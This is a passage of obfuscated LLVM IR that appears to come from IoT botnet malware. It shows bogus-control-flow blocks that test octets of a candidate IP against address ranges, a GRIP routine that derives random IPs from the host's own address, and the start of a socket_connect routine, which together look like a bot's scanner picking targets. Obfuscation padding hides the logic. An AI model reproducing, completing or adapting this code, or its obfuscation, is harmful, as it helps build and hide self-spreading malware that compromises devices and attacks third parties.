originalBB382alteredBB:                           ; preds = %originalBB382, %2758
  %5631 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5632 = zext i8 %5631 to i32
  %5633 = icmp eq i32 %5632, 82
  br label %originalBB382

originalBB386alteredBB:                           ; preds = %originalBB386, %2802
  %5634 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5635 = zext i8 %5634 to i32
  %5636 = icmp slt i32 %5635, 63
  br label %originalBB386

originalBB390alteredBB:                           ; preds = %originalBB390, %2846
  %5637 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5638 = zext i8 %5637 to i32
  %5639 = icmp sge i32 %5638, 220
  br label %originalBB390

originalBB394alteredBB:                           ; preds = %originalBB394, %2866
  %5640 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5641 = zext i8 %5640 to i32
  %5642 = icmp slt i32 %5641, 223
  br label %originalBB394

originalBB398alteredBB:                           ; preds = %originalBB398, %2906
  %5643 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5644 = zext i8 %5643 to i32
  %5645 = icmp eq i32 %5644, 222
  br label %originalBB398

originalBB402alteredBB:                           ; preds = %originalBB402, %2938
  %5646 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5647 = zext i8 %5646 to i32
  %5648 = icmp eq i32 %5647, 167
  br label %originalBB402

originalBB406alteredBB:                           ; preds = %originalBB406, %2982
  %5649 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5650 = zext i8 %5649 to i32
  %5651 = icmp eq i32 %5650, 45
  br label %originalBB406

originalBB410alteredBB:                           ; preds = %originalBB410, %3002
  %5652 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5653 = zext i8 %5652 to i32
  %5654 = icmp eq i32 %5653, 63
  br label %originalBB410

originalBB414alteredBB:                           ; preds = %originalBB414, %3034
  %5655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5656 = zext i8 %5655 to i32
  %5657 = icmp eq i32 %5656, 237
  br label %originalBB414

originalBB418alteredBB:                           ; preds = %originalBB418, %3058
  %5658 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5659 = zext i8 %5658 to i32
  %5660 = icmp slt i32 %5659, 159
  br label %originalBB418

originalBB422alteredBB:                           ; preds = %originalBB422, %3114
  %5661 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5662 = zext i8 %5661 to i32
  %5663 = icmp eq i32 %5662, 56
  br label %originalBB422

originalBB426alteredBB:                           ; preds = %originalBB426, %3142
  %5664 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5665 = zext i8 %5664 to i32
  %5666 = icmp eq i32 %5665, 185
  br label %originalBB426

originalBB430alteredBB:                           ; preds = %originalBB430, %3162
  %5667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5668 = zext i8 %5667 to i32
  %5669 = icmp eq i32 %5668, 61
  br label %originalBB430

originalBB434alteredBB:                           ; preds = %originalBB434, %3182
  %5670 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5671 = zext i8 %5670 to i32
  %5672 = icmp sge i32 %5671, 136
  br label %originalBB434

originalBB438alteredBB:                           ; preds = %originalBB438, %3202
  %5673 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5674 = zext i8 %5673 to i32
  %5675 = icmp slt i32 %5674, 139
  br label %originalBB438

originalBB442alteredBB:                           ; preds = %originalBB442, %3222
  %5676 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5677 = zext i8 %5676 to i32
  %5678 = icmp eq i32 %5677, 185
  br label %originalBB442

originalBB446alteredBB:                           ; preds = %originalBB446, %3242
  %5679 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5680 = zext i8 %5679 to i32
  %5681 = icmp eq i32 %5680, 62
  br label %originalBB446

originalBB450alteredBB:                           ; preds = %originalBB450, %3262
  %5682 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5683 = zext i8 %5682 to i32
  %5684 = icmp sge i32 %5683, 187
  br label %originalBB450

originalBB454alteredBB:                           ; preds = %originalBB454, %3282
  %5685 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5686 = zext i8 %5685 to i32
  %5687 = icmp slt i32 %5686, 191
  br label %originalBB454

originalBB458alteredBB:                           ; preds = %originalBB458, %3302
  %5688 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5689 = zext i8 %5688 to i32
  %5690 = icmp eq i32 %5689, 66
  br label %originalBB458

originalBB462alteredBB:                           ; preds = %originalBB462, %3326
  %5691 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5692 = zext i8 %5691 to i32
  %5693 = icmp sge i32 %5692, 120
  br label %originalBB462

originalBB466alteredBB:                           ; preds = %originalBB466, %3366
  %5694 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5695 = zext i8 %5694 to i32
  %5696 = icmp eq i32 %5695, 64
  br label %originalBB466

originalBB470alteredBB:                           ; preds = %originalBB470, %3398
  %5697 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5698 = zext i8 %5697 to i32
  %5699 = icmp eq i32 %5698, 63
  br label %originalBB470

originalBB474alteredBB:                           ; preds = %originalBB474, %3418
  %5700 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5701 = zext i8 %5700 to i32
  %5702 = icmp eq i32 %5701, 251
  br label %originalBB474

originalBB478alteredBB:                           ; preds = %originalBB478, %3438
  %5703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5704 = zext i8 %5703 to i32
  %5705 = icmp sge i32 %5704, 19
  br label %originalBB478

originalBB482alteredBB:                           ; preds = %originalBB482, %3458
  %5706 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5707 = zext i8 %5706 to i32
  %5708 = icmp slt i32 %5707, 21
  br label %originalBB482

originalBB486alteredBB:                           ; preds = %originalBB486, %3482
  %5709 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5710 = zext i8 %5709 to i32
  %5711 = icmp eq i32 %5710, 42
  br label %originalBB486

originalBB490alteredBB:                           ; preds = %originalBB490, %3506
  %5712 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5713 = zext i8 %5712 to i32
  %5714 = icmp slt i32 %5713, 75
  br label %originalBB490

originalBB494alteredBB:                           ; preds = %originalBB494, %3538
  %5715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5716 = zext i8 %5715 to i32
  %5717 = icmp slt i32 %5716, 115
  br label %originalBB494

originalBB498alteredBB:                           ; preds = %originalBB498, %3562
  %5718 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5719 = zext i8 %5718 to i32
  %5720 = icmp eq i32 %5719, 201
  br label %originalBB498

originalBB502alteredBB:                           ; preds = %originalBB502, %3618
  %5721 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5722 = zext i8 %5721 to i32
  %5723 = icmp eq i32 %5722, 202
  br label %originalBB502

originalBB506alteredBB:                           ; preds = %originalBB506, %3638
  %5724 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5725 = zext i8 %5724 to i32
  %5726 = icmp eq i32 %5725, 151
  br label %originalBB506

originalBB510alteredBB:                           ; preds = %originalBB510, %3662
  %5727 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5728 = zext i8 %5727 to i32
  %5729 = icmp eq i32 %5728, 164
  br label %originalBB510

originalBB514alteredBB:                           ; preds = %originalBB514, %3686
  %5730 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5731 = zext i8 %5730 to i32
  %5732 = icmp eq i32 %5731, 176
  br label %originalBB514

originalBB518alteredBB:                           ; preds = %originalBB518, %3710
  %5733 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5734 = zext i8 %5733 to i32
  %5735 = icmp eq i32 %5734, 167
  br label %originalBB518

originalBB522alteredBB:                           ; preds = %originalBB522, %3730
  %5736 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5737 = zext i8 %5736 to i32
  %5738 = icmp eq i32 %5737, 114
  br label %originalBB522

originalBB526alteredBB:                           ; preds = %originalBB526, %3754
  %5739 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5740 = zext i8 %5739 to i32
  %5741 = icmp eq i32 %5740, 32
  br label %originalBB526

originalBB530alteredBB:                           ; preds = %originalBB530, %3778
  %5742 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5743 = zext i8 %5742 to i32
  %5744 = icmp eq i32 %5743, 33
  br label %originalBB530

originalBB534alteredBB:                           ; preds = %originalBB534, %3806
  %5745 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5746 = zext i8 %5745 to i32
  %5747 = icmp eq i32 %5746, 37
  br label %originalBB534

originalBB538alteredBB:                           ; preds = %originalBB538, %3826
  %5748 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5749 = zext i8 %5748 to i32
  %5750 = icmp eq i32 %5749, 187
  br label %originalBB538

originalBB542alteredBB:                           ; preds = %originalBB542, %3846
  %5751 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5752 = zext i8 %5751 to i32
  %5753 = icmp eq i32 %5752, 46
  br label %originalBB542

originalBB546alteredBB:                           ; preds = %originalBB546, %3882
  %5754 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5755 = zext i8 %5754 to i32
  %5756 = icmp eq i32 %5755, 255
  br label %originalBB546

originalBB550alteredBB:                           ; preds = %originalBB550, %3910
  %5757 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5758 = zext i8 %5757 to i32
  %5759 = icmp eq i32 %5758, 5
  br label %originalBB550

originalBB554alteredBB:                           ; preds = %originalBB554, %3930
  %5760 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5761 = zext i8 %5760 to i32
  %5762 = icmp eq i32 %5761, 196
  br label %originalBB554

originalBB558alteredBB:                           ; preds = %originalBB558, %3950
  %5763 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5764 = zext i8 %5763 to i32
  %5765 = icmp eq i32 %5764, 5
  br label %originalBB558

originalBB562alteredBB:                           ; preds = %originalBB562, %3978
  %5766 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5767 = zext i8 %5766 to i32
  %5768 = icmp eq i32 %5767, 134
  br label %originalBB562

originalBB566alteredBB:                           ; preds = %originalBB566, %4006
  %5769 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5770 = zext i8 %5769 to i32
  %5771 = icmp sge i32 %5770, 128
  br label %originalBB566

originalBB570alteredBB:                           ; preds = %originalBB570, %4030
  %5772 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5773 = zext i8 %5772 to i32
  %5774 = icmp eq i32 %5773, 107
  br label %originalBB570

originalBB574alteredBB:                           ; preds = %originalBB574, %4066
  %5775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5776 = zext i8 %5775 to i32
  %5777 = icmp eq i32 %5776, 181
  br label %originalBB574

originalBB578alteredBB:                           ; preds = %originalBB578, %4090
  %5778 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5779 = zext i8 %5778 to i32
  %5780 = icmp slt i32 %5779, 189
  br label %originalBB578

originalBB582alteredBB:                           ; preds = %originalBB582, %4110
  %5781 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5782 = zext i8 %5781 to i32
  %5783 = icmp eq i32 %5782, 172
  br label %originalBB582

originalBB586alteredBB:                           ; preds = %originalBB586, %4134
  %5784 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5785 = zext i8 %5784 to i32
  %5786 = icmp sge i32 %5785, 64
  br label %originalBB586

originalBB590alteredBB:                           ; preds = %originalBB590, %4166
  %5787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5788 = zext i8 %5787 to i32
  %5789 = icmp sge i32 %5788, 240
  br label %originalBB590

originalBB594alteredBB:                           ; preds = %originalBB594, %4198
  %5790 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5791 = zext i8 %5790 to i32
  %5792 = icmp sge i32 %5791, 128
  br label %originalBB594

originalBB598alteredBB:                           ; preds = %originalBB598, %4218
  %5793 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5794 = zext i8 %5793 to i32
  %5795 = icmp slt i32 %5794, 143
  br label %originalBB598

originalBB602alteredBB:                           ; preds = %originalBB602, %4258
  %5796 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5797 = zext i8 %5796 to i32
  %5798 = icmp eq i32 %5797, 40
  br label %originalBB602

originalBB606alteredBB:                           ; preds = %originalBB606, %4298
  %5799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5800 = zext i8 %5799 to i32
  %5801 = icmp slt i32 %5800, 95
  br label %originalBB606

originalBB610alteredBB:                           ; preds = %originalBB610, %4322
  %5802 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5803 = zext i8 %5802 to i32
  %5804 = icmp eq i32 %5803, 116
  br label %originalBB610

originalBB614alteredBB:                           ; preds = %originalBB614, %4354
  %5805 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5806 = zext i8 %5805 to i32
  %5807 = icmp eq i32 %5806, 229
  br label %originalBB614

originalBB618alteredBB:                           ; preds = %originalBB618, %4374
  %5808 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5809 = zext i8 %5808 to i32
  %5810 = icmp sge i32 %5809, 248
  br label %originalBB618

originalBB622alteredBB:                           ; preds = %originalBB622, %4398
  %5811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5812 = zext i8 %5811 to i32
  %5813 = icmp eq i32 %5812, 199
  br label %originalBB622

originalBB626alteredBB:                           ; preds = %originalBB626, %4426
  %5814 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5815 = zext i8 %5814 to i32
  %5816 = icmp slt i32 %5815, 223
  br label %originalBB626

originalBB630alteredBB:                           ; preds = %originalBB630, %4450
  %5817 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5818 = zext i8 %5817 to i32
  %5819 = icmp eq i32 %5818, 58
  br label %originalBB630

originalBB634alteredBB:                           ; preds = %originalBB634, %4498
  %5820 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5821 = zext i8 %5820 to i32
  %5822 = icmp eq i32 %5821, 78
  br label %originalBB634

originalBB638alteredBB:                           ; preds = %originalBB638, %4518
  %5823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5824 = zext i8 %5823 to i32
  %5825 = icmp sge i32 %5824, 40
  br label %originalBB638

originalBB642alteredBB:                           ; preds = %originalBB642, %4538
  %5826 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5827 = zext i8 %5826 to i32
  %5828 = icmp slt i32 %5827, 43
  br label %originalBB642

originalBB646alteredBB:                           ; preds = %originalBB646, %4570
  %5829 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5830 = zext i8 %5829 to i32
  %5831 = icmp slt i32 %5830, 193
  br label %originalBB646

originalBB650alteredBB:                           ; preds = %originalBB650, %4590
  %5832 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5833 = zext i8 %5832 to i32
  %5834 = icmp eq i32 %5833, 66
  br label %originalBB650

originalBB654alteredBB:                           ; preds = %originalBB654, %4618
  %5835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5836 = zext i8 %5835 to i32
  %5837 = icmp slt i32 %5836, 255
  br label %originalBB654

originalBB658alteredBB:                           ; preds = %originalBB658, %4642
  %5838 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5839 = zext i8 %5838 to i32
  %5840 = icmp eq i32 %5839, 142
  br label %originalBB658

originalBB662alteredBB:                           ; preds = %originalBB662, %4670
  %5841 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5842 = zext i8 %5841 to i32
  %5843 = icmp eq i32 %5842, 107
  br label %originalBB662

originalBB666alteredBB:                           ; preds = %originalBB666, %4698
  %5844 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5845 = zext i8 %5844 to i32
  %5846 = icmp eq i32 %5845, 35
  br label %originalBB666

originalBB670alteredBB:                           ; preds = %originalBB670, %4738
  %5847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5848 = zext i8 %5847 to i32
  %5849 = icmp eq i32 %5848, 52
  br label %originalBB670

originalBB674alteredBB:                           ; preds = %originalBB674, %4762
  %5850 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5851 = zext i8 %5850 to i32
  %5852 = icmp slt i32 %5851, 255
  br label %originalBB674

originalBB678alteredBB:                           ; preds = %originalBB678, %4782
  %5853 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5854 = zext i8 %5853 to i32
  %5855 = icmp eq i32 %5854, 54
  br label %originalBB678

originalBB682alteredBB:                           ; preds = %originalBB682, %4810
  %5856 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5857 = zext i8 %5856 to i32
  %5858 = icmp eq i32 %5857, 54
  br label %originalBB682

originalBB686alteredBB:                           ; preds = %originalBB686, %4874
  %5859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5860 = zext i8 %5859 to i32
  %5861 = icmp sge i32 %5860, 15
  br label %originalBB686

originalBB690alteredBB:                           ; preds = %originalBB690, %4894
  %5862 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5863 = zext i8 %5862 to i32
  %5864 = icmp slt i32 %5863, 255
  br label %originalBB690

originalBB694alteredBB:                           ; preds = %originalBB694, %4914
  %5865 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5866 = zext i8 %5865 to i32
  %5867 = icmp eq i32 %5866, 79
  br label %originalBB694

originalBB698alteredBB:                           ; preds = %originalBB698, %4950
  %5868 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5869 = zext i8 %5868 to i32
  %5870 = icmp eq i32 %5869, 47
  br label %originalBB698

originalBB702alteredBB:                           ; preds = %originalBB702, %4970
  %5871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5872 = zext i8 %5871 to i32
  %5873 = icmp sge i32 %5872, 224
  br label %originalBB702

originalBB706alteredBB:                           ; preds = %originalBB706, %4998
  %5874 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5875 = zext i8 %5874 to i32
  %5876 = icmp eq i32 %5875, 34
  br label %originalBB706

originalBB710alteredBB:                           ; preds = %originalBB710, %5038
  %5877 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5878 = zext i8 %5877 to i32
  %5879 = icmp eq i32 %5878, 23
  br label %originalBB710

originalBB714alteredBB:                           ; preds = %originalBB714, %5078
  %5880 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5881 = zext i8 %5880 to i32
  %5882 = icmp eq i32 %5881, 106
  br label %originalBB714

originalBB718alteredBB:                           ; preds = %originalBB718, %5114
  %5883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5884 = zext i8 %5883 to i32
  %5885 = icmp eq i32 %5884, 106
  br label %originalBB718

originalBB722alteredBB:                           ; preds = %originalBB722, %5138
  %5886 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5887 = zext i8 %5886 to i32
  %5888 = icmp eq i32 %5887, 34
  br label %originalBB722

originalBB726alteredBB:                           ; preds = %originalBB726, %5158
  %5889 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5890 = zext i8 %5889 to i32
  %5891 = icmp sge i32 %5890, 245
  br label %originalBB726

originalBB730alteredBB:                           ; preds = %originalBB730, %5198
  %5892 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5893 = zext i8 %5892 to i32
  %5894 = icmp eq i32 %5893, 208
  br label %originalBB730

originalBB734alteredBB:                           ; preds = %originalBB734, %5218
  %5895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5896 = zext i8 %5895 to i32
  %5897 = icmp eq i32 %5896, 86
  br label %originalBB734

originalBB738alteredBB:                           ; preds = %originalBB738, %5270
  %5898 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5899 = zext i8 %5898 to i32
  %5900 = icmp eq i32 %5899, 78
  br label %originalBB738

originalBB742alteredBB:                           ; preds = %originalBB742, %5298
  br label %originalBB742
}

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define i32 @GRIP(i32) #0 {
  %2 = load i32, i32* @x.67
  %3 = load i32, i32* @y.68
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %13 = call i32 @ntohl(i32 %12) #10
  %14 = load i32, i32* %10, align 4
  %15 = and i32 %13, %14
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* %11, align 4
  %17 = call i32 @rand_cmwc()
  %18 = load i32, i32* %10, align 4
  %19 = xor i32 %18, -1
  %20 = and i32 %17, %19
  %21 = xor i32 %16, %20
  %22 = load i32, i32* @x.67
  %23 = load i32, i32* @y.68
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %21

originalBBalteredBB:                              ; preds = %originalBB, %1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i32 %0, i32* %30, align 4
  %32 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %33 = call i32 @ntohl(i32 %32) #10
  %34 = load i32, i32* %30, align 4
  %_ = shl i32 %33, %34
  %_1 = shl i32 %33, %34
  %_2 = sub i32 %33, %34
  %gen = mul i32 %_2, %34
  %35 = and i32 %33, %34
  store i32 %35, i32* %31, align 4
  %36 = load i32, i32* %31, align 4
  %37 = call i32 @rand_cmwc()
  %38 = load i32, i32* %30, align 4
  %_3 = sub i32 %38, -1
  %gen4 = mul i32 %_3, -1
  %_5 = sub i32 0, %38
  %gen6 = add i32 %_5, -1
  %_7 = sub i32 %38, -1
  %gen8 = mul i32 %_7, -1
  %_9 = shl i32 %38, -1
  %_10 = sub i32 0, %38
  %gen11 = add i32 %_10, -1
  %39 = xor i32 %38, -1
  %_12 = sub i32 0, %37
  %gen13 = add i32 %_12, %39
  %_14 = sub i32 0, %37
  %gen15 = add i32 %_14, %39
  %40 = and i32 %37, %39
  %_16 = shl i32 %36, %40
  %_17 = shl i32 %36, %40
  %_18 = shl i32 %36, %40
  %_19 = sub i32 %36, %40
  %gen20 = mul i32 %_19, %40
  %_21 = sub i32 0, %36
  %gen22 = add i32 %_21, %40
  %_23 = sub i32 %36, %40
  %gen24 = mul i32 %_23, %40
  %_25 = sub i32 0, %36
  %gen26 = add i32 %_25, %40
  %_27 = sub i32 %36, %40
  %gen28 = mul i32 %_27, %40
  %41 = xor i32 %36, %40
  br label %originalBB
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %61

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
